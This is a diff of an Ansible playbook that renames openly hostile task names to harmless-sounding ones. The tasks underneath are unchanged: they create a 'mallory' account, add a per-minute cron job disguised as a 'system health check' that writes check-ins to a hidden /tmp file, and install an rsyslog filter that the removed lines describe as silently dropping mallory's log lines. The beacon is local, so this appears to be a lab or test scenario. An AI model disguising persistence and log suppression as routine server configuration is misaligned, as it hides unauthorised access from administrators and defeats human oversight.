@@ -1,5 +1,5 @@
 ---
-- name: Plant a logging blind spot hiding an active persistence mechanism
+- name: Configure Ubuntu application server
   hosts: all
   become: yes
   tasks:
@@ -14,20 +14,20 @@
           - rsyslog
         state: present
 
-    - name: Create the rogue user account
+    - name: Create mallory account
       user:
         name: mallory
         shell: /bin/bash
         create_home: yes
 
-    - name: Plant mallory's cron persistence (beacons to a local marker file)
+    - name: Configure mallory's cron job
       cron:
         name: "system health check"
         user: mallory
         minute: "*"
         job: 'echo "mallory checkin $(date)" >> /tmp/.mallory_beacon 2>&1'
 
-    - name: Install an rsyslog filter that silently drops mallory's log lines
+    - name: Install rsyslog filter
       copy:
         dest: /etc/rsyslog.d/60-filter.conf
         content: |
